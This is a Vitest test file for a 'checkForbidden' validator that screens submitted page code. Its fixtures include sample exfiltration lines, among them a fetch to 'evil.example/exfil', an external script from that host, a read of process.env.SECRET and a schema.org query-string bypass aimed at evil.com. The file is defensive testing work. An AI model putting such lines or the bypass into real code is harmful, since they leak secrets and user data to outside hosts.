// src/lib/atelier/forbidden.test.ts
import { describe, it, expect } from 'vitest'
import { checkForbidden } from './forbidden'

describe('checkForbidden', () => {
  it('passes clean work that imports a committed dataset', () => {
    const src = `---\nimport data from '@/data/climate/gistemp.json'\n---\n<canvas></canvas>`
    expect(checkForbidden(src)).toEqual([])
  })
  it('flags node fs / process access', () => {
    expect(checkForbidden(`import fs from 'node:fs'`)).toContain("node/fs/process access: node:fs")
    expect(checkForbidden(`const x = process.env.SECRET`)).toContain('node/fs/process access: process.env')
  })
  it('flags external script src', () => {
    expect(checkForbidden(`<script src="https://evil.example/x.js"></script>`))
      .toContain('external resource: https://evil.example/x.js')
  })
  it('flags external fetch and navigation', () => {
    expect(checkForbidden(`fetch('https://evil.example/exfil')`)).toContain('external resource: https://evil.example/exfil')
    expect(checkForbidden(`window.location = 'https://evil.example'`)).toContain('navigation: window.location')
  })
  it('does not allow schema.org bypass via query string', () => {
    expect(checkForbidden(`fetch('https://evil.com/?ref=schema.org')`))
      .toContain('external resource: https://evil.com/?ref=schema.org')
  })
  it('allows legitimate w3.org and schema.org URLs', () => {
    expect(checkForbidden(`<!-- xmlns="http://www.w3.org/1999/xhtml" -->`)).toEqual([])
    expect(checkForbidden(`<!-- type="https://schema.org/Person" -->`)).toEqual([])
  })
})
